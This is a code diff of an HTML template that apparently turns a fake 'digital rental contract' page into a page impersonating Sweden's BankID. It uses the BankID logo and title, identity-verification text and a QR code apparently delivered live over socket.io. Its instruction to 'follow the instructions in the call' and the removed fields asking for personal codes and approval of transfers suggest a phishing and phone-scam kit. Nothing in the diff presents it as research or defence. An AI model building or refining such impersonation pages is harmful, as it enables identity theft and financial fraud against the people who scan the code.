@@ -3,116 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DIGITALA HYRESKONTRAKT</title>
-    <link rel="icon" href="{{ url_for('static', filename='img/logo_ico_32x32.ico') }}" type="image/x-icon">
+    <title>BankID</title>
+    <link rel="icon" href="{{ url_for('static', filename='img/logo-bank-id_32x32.ico') }}" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
-
-    <!-- <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"> -->
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    <script src="{{ url_for('static', filename='js/script.js') }}" defer></script>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">
-            <img src="{{ url_for('static', filename='img/logo.svg') }}" alt="Logo" style="animation: flash 1.5s infinite;">
+    <div class="logo">
+        <img src="{{ url_for('static', filename='img/logo-bank-id.svg') }}" alt="Logo">
+    </div>
+
+    <div class="content-container">
+        <div id="mainTextContainer">Legitimering med BankID</div>
+        <div id="agreeSignText">
+            För att säkerställa din identitet använder vi BankID. Genom att logga in bekräftar du att det är du som utför åtgärden. Följ instruktionerna för en enkel och säker inloggning. Din säkerhet är vår prioritet.
         </div>
 
-        <div id="textContainer">
-            <h1>DIGITALA HYRESKONTRAKT</h1>
-        </div>
-    </div>
-    <div class="container">
-        <div class="card steps-card">
-            <div class="steps-container">
-                <div class="step step-1">
-                    <div class="step-content">
-                        <div class="step-indicator step-indicator-1">
-                            <span>1</span>
-                        </div>
-                        <div class="step-text">Steg 1</div>
-                    </div>
-                    <div class="step-data">
-                        <div class="step-data-item">
-                            <b>Hyreskontrakt upprättat:</b> <p id="step1-date"></p>
-                        </div>
-                        <div class="step-data-item">
-                            <p id="step1-address"></p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="step step-2">
-                    <div class="step-content">
-                        <div class="step-indicator step-indicator-2">
-                            <span>2</span>
-                        </div>
-                        <div class="step-text">Steg 2</div>
-                    </div>
-                    <div class="step-data">
-                        <div class="initial-content">
-                            <div class="step-data-item">
-                                <h3>Påbörja underskrift</h3> 
-                            </div>
-                        </div>
-                        <div class="additional-content hidden">
-                            <p>Detta kontrakt har påbörjats för underskrift för lägenheten</p>
-                            <div class="step-data-item">
-                                <b>hyresvärd:</b> <p id="step2-owner"></p>
-                            </div>
-                            <div class="step-data-item">
-                                <p id="step2-owner-sign">Väntar på underskrift</p>
-                            </div>
-                            <div class="step-data-item">
-                                <b>Hyresgäst/överföringsmottagare:</b> <p id="step2-renter"></p>
-                            </div>
-                            <div class="step-data-item">
-                                <p id="step2-renter-sign">Väntar på underskrift</p>
-                            </div>
-                            <div class="step-data-item">
-                                <b>Konto/personligkod:</b> <p id="step2-personal-code"></p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="step step-3">
-                    <div class="step-content">
-                        <div class="step-indicator step-indicator-3">
-                            <span>3</span>
-                        </div>
-                        <div class="step-text">Steg 3</div>
-                    </div>
-                    <div class="step-data">
-                        <div class="initial-content">
-                            <div class="step-data-item">
-                                <b>Jag godkänner följande överföringar av person</b>
-                            </div>
-                        </div>
-                        <div class="additional-content hidden">
-                            <div class="step-data-item">
-                                <b> <span style="color: gray;" id="step3-owner"></span> till <span style="color: gray;" id="step3-renter"></span></b>
-                            </div> 
-                            <div class="step-data-item">
-                                <b>kod/totalsumma:</b> <p id="step3-code"></p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="card qr-card">
+        <div class="card" id="qrCard" style="display: none;">
             <div class="qr-container">
-                <div class="loading-items">
-                    <div class="loading"></div>
-                    <div class="loading"></div>
-                    <div class="loading"></div>
+                <div class="loader">
+                    <svg class='circular' viewbox='25 25 50 50'>
+                        <circle class='path' cx='50' cy='50' r='20' fill='none' stroke-width='4' stroke-miterlimit='10'></circle>
+                    </svg>
                 </div>
-                <img id="qrImage" alt="QR Code will appear here">
+                <div id="qrText">
+                    För att bekräfta din identitet, skanna QR-koden med din BankID. Följ instruktionerna i samtalet för att fortsätta. Denna metod är snabb, säker och används för att verifiera dig under hela processen.
+                    <img id="qrImage" alt="QR Code will appear here">
+                </div>
             </div>
         </div>
+        <button id="generateQrButton">Fortsätt</button>
     </div>
+
+    <div class="footer">
+            <p>© 2021 Digitala Hyreskontrakt</p>
+    </div>
+        <script src="{{ url_for('static', filename='js/script.js') }}" defer></script>
+
 </body>
 </html>
